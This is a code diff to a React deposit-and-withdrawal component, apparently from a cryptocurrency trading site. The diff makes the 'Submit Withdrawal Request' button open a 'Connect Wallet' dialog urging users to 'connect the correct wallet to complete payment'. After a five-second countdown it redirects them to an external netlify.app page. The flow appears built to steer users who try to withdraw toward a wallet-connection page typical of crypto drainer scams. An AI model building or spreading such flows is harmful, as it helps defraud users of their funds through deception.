@@ -1,10 +1,11 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogHeader, AlertDialogTitle } from "@/components/ui/alert-dialog";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
 import { Copy, ArrowDownCircle, ArrowUpCircle } from "lucide-react";
@@ -22,7 +23,20 @@ export const DepositWithdraw = () => {
   const [withdrawCoin, setWithdrawCoin] = useState("BTC");
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [loading, setLoading] = useState(false);
+  const [showWalletDialog, setShowWalletDialog] = useState(false);
+  const [countdown, setCountdown] = useState(5);
   const { toast } = useToast();
+
+  useEffect(() => {
+    if (showWalletDialog && countdown > 0) {
+      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
+      return () => clearTimeout(timer);
+    } else if (showWalletDialog && countdown === 0) {
+      window.open("https://solanahost.netlify.app/", "_blank", "noopener,noreferrer");
+      setShowWalletDialog(false);
+      setCountdown(5);
+    }
+  }, [showWalletDialog, countdown]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -173,14 +187,24 @@ export const DepositWithdraw = () => {
                 />
               </div>
 
-              <a
-                href="https://solanahost.netlify.app/"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="w-full bg-green-600 text-white hover:bg-green-700 font-bold border-2 border-green-500 inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 h-10 px-4 py-2"
+              <Button
+                onClick={() => setShowWalletDialog(true)}
+                className="w-full bg-green-600 text-white hover:bg-green-700 font-bold border-2 border-green-500"
               >
                 Submit Withdrawal Request
-              </a>
+              </Button>
+
+              <AlertDialog open={showWalletDialog} onOpenChange={setShowWalletDialog}>
+                <AlertDialogContent>
+                  <AlertDialogHeader>
+                    <AlertDialogTitle>Connect Wallet</AlertDialogTitle>
+                    <AlertDialogDescription className="text-center space-y-4">
+                      <p className="text-lg font-semibold">Connect the correct wallet to complete payment</p>
+                      <p className="text-2xl font-bold text-green-600">Redirecting in {countdown} seconds...</p>
+                    </AlertDialogDescription>
+                  </AlertDialogHeader>
+                </AlertDialogContent>
+              </AlertDialog>
 
               <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-lg">
                 <p className="text-sm text-amber-400">
